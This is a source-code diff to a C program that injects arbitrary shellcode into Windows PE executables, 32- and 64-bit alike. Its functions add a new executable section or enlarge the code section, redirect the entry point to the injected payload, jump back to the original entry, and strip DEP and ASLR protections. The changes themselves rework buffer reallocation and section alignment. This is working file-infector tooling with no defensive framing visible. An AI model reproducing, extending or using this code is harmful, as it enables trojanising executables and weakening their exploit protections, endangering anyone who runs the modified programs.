@@ -15,8 +15,6 @@
 						nt_header->nt_optional_header.dll_characteristics = nt_header->nt_optional_header.dll_characteristics & ~DLL_CHARACTER_NX_COMPAT;
 
 
-
-
 int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
 		return -1;
@@ -240,16 +238,16 @@ int pe64_infect_section(pe64_nt_header* nt_header, list_pe_section_t sections, u
 	return 0;
 }
 
-int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
+int pe_infect_new_section(pe_nt_header* nt_header, char** file_data, uint32_t* file_size, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0' || !new_section_name || *new_section_name == '\0') {
 		return -1;
 	}
 	
 	//search first code sections
-	uint32_t higher_raw_offset = 0;
-	uint32_t higher_raw_size = 0;
-	uint32_t higher_virtual_offset = 0;
-	uint32_t higher_virtual_size = 0;
+	uint32_t highest_raw_offset = 0;
+	uint32_t highest_raw_size = 0;
+	uint32_t highest_virtual_offset = 0;
+	uint32_t highest_virtual_size = 0;
 	
 	list_pe_section_t curSect = sections;
 	list_pe_section_t codeSect = NULL;
@@ -261,15 +259,15 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 			codeSect = curSect;
 		}
 		
-		if (curSect->header.PointerToRawData > higher_raw_offset) {
+		if (curSect->header.PointerToRawData > highest_raw_offset) {
 			lastSect = curSect;
-			higher_raw_offset = lastSect->header.PointerToRawData;
-			higher_raw_size = lastSect->header.SizeOfRawData;
+			highest_raw_offset = lastSect->header.PointerToRawData;
+			highest_raw_size = lastSect->header.SizeOfRawData;
 		}
 		
-		if (curSect->header.VirtualAddress >higher_virtual_offset) {
-			higher_virtual_offset = curSect->header.VirtualAddress;
-			higher_virtual_size = curSect->header.Misc.VirtualSize;
+		if (curSect->header.VirtualAddress >highest_virtual_offset) {
+			highest_virtual_offset = curSect->header.VirtualAddress;
+			highest_virtual_size = curSect->header.Misc.VirtualSize;
 		}
 		
 		curSect = curSect->next;
@@ -291,18 +289,33 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
 	newSect->header.Misc.VirtualSize = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
 								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
-	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
+	newSect->header.VirtualAddress = P2ALIGNUP(highest_virtual_offset + highest_virtual_size, nt_header->nt_optional_header.section_alignment);
 	newSect->header.SizeOfRawData = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.file_alignment)
 								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
-	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
+	newSect->header.PointerToRawData = P2ALIGNUP(highest_raw_offset + highest_raw_size, nt_header->nt_optional_header.file_alignment);
 	newSect->header.Characteristics = SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;
+
 	//fill section data
-	newSect->data = (char*)malloc(newSect->header.SizeOfRawData);
-	if (!newSect->data) {
+	*file_data = (char*)realloc(*file_data, *file_size + newSect->header.SizeOfRawData);
+	if (!(*file_data)) {
 		//internal error: can't allocate memory for new section data
-		free(newSect);
-		return -4;
+	 	free(newSect);
+	 	return -4;
 	}
+
+	newSect->data = *file_data + newSect->header.PointerToRawData;
+
+	//fillup new place by zeroes
+	memset(newSect->data, 0, newSect->header.SizeOfRawData);
+
+	//realloc old section's pointers
+	curSect = sections;
+
+	while (curSect) {
+		curSect->data = *file_data + curSect->header.PointerToRawData;
+		curSect = curSect->next;
+	}
+
 	newSect->next = NULL;
 	lastSect->next = newSect;
 	nt_header->nt_file_header.number_of_sections++;
@@ -399,20 +412,22 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
 	DISABLE_DEP_ASLR
+
+	*file_size += newSect->header.SizeOfRawData;
 	
 	return 0;
 }
 
-int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
+int pe64_infect_new_section(pe64_nt_header* nt_header, char** file_data, uint32_t* file_size, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0' || !new_section_name || *new_section_name == '\0') {
 		return -1;
 	}
 	
 	//search first code sections
-	uint32_t higher_raw_offset = 0;
-	uint32_t higher_raw_size = 0;
-	uint32_t higher_virtual_offset = 0;
-	uint32_t higher_virtual_size = 0;
+	uint32_t highest_raw_offset = 0;
+	uint32_t highest_raw_size = 0;
+	uint32_t highest_virtual_offset = 0;
+	uint32_t highest_virtual_size = 0;
 	
 	list_pe_section_t curSect = sections;
 	list_pe_section_t codeSect = NULL;
@@ -424,15 +439,15 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 			codeSect = curSect;
 		}
 		
-		if (curSect->header.PointerToRawData > higher_raw_offset) {
+		if (curSect->header.PointerToRawData > highest_raw_offset) {
 			lastSect = curSect;
-			higher_raw_offset = lastSect->header.PointerToRawData;
-			higher_raw_size = lastSect->header.SizeOfRawData;
+			highest_raw_offset = lastSect->header.PointerToRawData;
+			highest_raw_size = lastSect->header.SizeOfRawData;
 		}
 		
-		if (curSect->header.VirtualAddress >higher_virtual_offset) {
-			higher_virtual_offset = curSect->header.VirtualAddress;
-			higher_virtual_size = curSect->header.Misc.VirtualSize;
+		if (curSect->header.VirtualAddress >highest_virtual_offset) {
+			highest_virtual_offset = curSect->header.VirtualAddress;
+			highest_virtual_size = curSect->header.Misc.VirtualSize;
 		}
 		
 		curSect = curSect->next;
@@ -455,19 +470,33 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 
 	newSect->header.Misc.VirtualSize = thread_flag ? P2ALIGNUP(xcode_size + 0x10 + 0x122, nt_header->nt_optional_header.section_alignment)
 								:	P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.section_alignment);
-	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
+	newSect->header.VirtualAddress = P2ALIGNUP(highest_virtual_offset + highest_virtual_size, nt_header->nt_optional_header.section_alignment);
 	newSect->header.SizeOfRawData = thread_flag ? P2ALIGNUP(xcode_size + 0x10 + 0x122, nt_header->nt_optional_header.file_alignment)
 								:	P2ALIGNUP(xcode_size + 0x10, nt_header->nt_optional_header.file_alignment);
 
-	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
+	newSect->header.PointerToRawData = P2ALIGNUP(highest_raw_offset + highest_raw_size, nt_header->nt_optional_header.file_alignment);
 	newSect->header.Characteristics = SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;
-	//fill section data
-	newSect->data = (char*)malloc(newSect->header.SizeOfRawData);
-	if (!newSect->data) {
+
+	*file_data = (char*)realloc(*file_data, *file_size + newSect->header.SizeOfRawData);
+	if (!(*file_data)) {
 		//internal error: can't allocate memory for new section data
-		free(newSect);
-		return -4;
+	 	free(newSect);
+	 	return -4;
 	}
+
+	newSect->data = *file_data + newSect->header.PointerToRawData;
+
+	//fillup new place by zeroes
+	memset(newSect->data, 0, newSect->header.SizeOfRawData);
+
+	//realloc old section's pointers
+	curSect = sections;
+
+	while (curSect) {
+		curSect->data = *file_data + curSect->header.PointerToRawData;
+		curSect = curSect->next;
+	}
+
 	newSect->next = NULL;
 	lastSect->next = newSect;
 	nt_header->nt_file_header.number_of_sections++;
@@ -569,11 +598,13 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
 	DISABLE_DEP_ASLR
+
+	*file_size += newSect->header.SizeOfRawData;
 	
 	return 0;
 }
 
-int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
+int pe_infect_resize_section(pe_nt_header* nt_header, char** file_data, uint32_t* file_size, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
 		return -1;
 	}
@@ -624,11 +655,30 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 	fprintf(stdout, "newVirtualSize + codeSect->header.VirtualAddress: 0x%04X\n", newVirtualSize + codeSect->header.VirtualAddress);
 	fprintf(stdout, "nearSect->header.VirtualAddress: 0x%04X\n", nearSect->header.VirtualAddress);
 	
-	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
+	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData - 1;
 	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
 	codeSect->header.Misc.VirtualSize = newVirtualSize;
 	codeSect->header.SizeOfRawData = newRawSize;
-	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
+	
+	//realloc here
+	*file_data = (char*)realloc(*file_data, *file_size + diff_rawSize);
+	if (!(*file_data)) {
+		//internal error: can't allocate memory for new size of data
+		return -5;
+	}
+
+	//update sections
+	//realloc old section's pointers
+	curSect = sections;
+
+	while (curSect) {
+		curSect->data = *file_data + curSect->header.PointerToRawData;
+		curSect = curSect->next;
+	}
+
+	//move all data after code section
+	curSect = codeSect->next;
+	memmove(*file_data + curSect->header.PointerToRawData + diff_rawSize, *file_data + curSect->header.PointerToRawData, *file_size - curSect->header.PointerToRawData);
 	
 	if (!codeSect->data) {
 		//cannot allocate memory for new data
@@ -647,6 +697,7 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 	}
 
 	injection_xcode_offset += 8;
+	injection_xcode_offset++;
 	
 	//align another sections (if it need)
 	curSect = sections;
@@ -703,11 +754,13 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
 		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
 	}
+
+	*file_size += diff_rawSize;
 	
 	return 0;
 }
 
-int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
+int pe64_infect_resize_section(pe64_nt_header* nt_header, char** file_data, uint32_t* file_size, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
 		return -1;
 	}
@@ -755,11 +808,37 @@ int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sect
 		return -3;
 	}
 	
-	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
+	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData - 1;
 	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
 	codeSect->header.Misc.VirtualSize = newVirtualSize;
 	codeSect->header.SizeOfRawData = newRawSize;
-	codeSect->data = (char*)realloc(codeSect->data, codeSect->header.SizeOfRawData);
+	
+	//realloc here
+	*file_data = (char*)realloc(*file_data, *file_size + diff_rawSize);
+	if (!(*file_data)) {
+		//internal error: can't allocate memory for new size of data
+		return -5;
+	}
+
+	//update sections
+	//realloc old section's pointers
+	curSect = sections;
+
+	while (curSect) {
+		curSect->data = *file_data + curSect->header.PointerToRawData;
+		curSect = curSect->next;
+	}
+
+	//move all data after code section
+	curSect = sections;
+	while (curSect) {
+		if (curSect->header.PointerToRawData > codeSect->header.PointerToRawData) {
+			memmove(*file_data + curSect->header.PointerToRawData + diff_rawSize, *file_data + curSect->header.PointerToRawData, *file_size - curSect->header.PointerToRawData);
+			break;
+		}
+		
+		curSect = curSect->next;
+	}
 	
 	if (!codeSect->data) {
 		//cannot allocate memory for new data
@@ -782,6 +861,7 @@ int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sect
 	}
 
 	injection_xcode_offset += 16;
+	injection_xcode_offset++;
 	
 	//align another sections (if it need)
 	curSect = sections;
@@ -843,6 +923,8 @@ int pe64_infect_resize_section(pe64_nt_header* nt_header, list_pe_section_t sect
 		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_rax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
 		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_rax_bytecode) + sizeof(hex_original_entry_point), jmp_rax_nop_bytecode, sizeof(jmp_rax_nop_bytecode));
 	}
+
+	*file_size += diff_rawSize;
 	
 	return 0;
 }
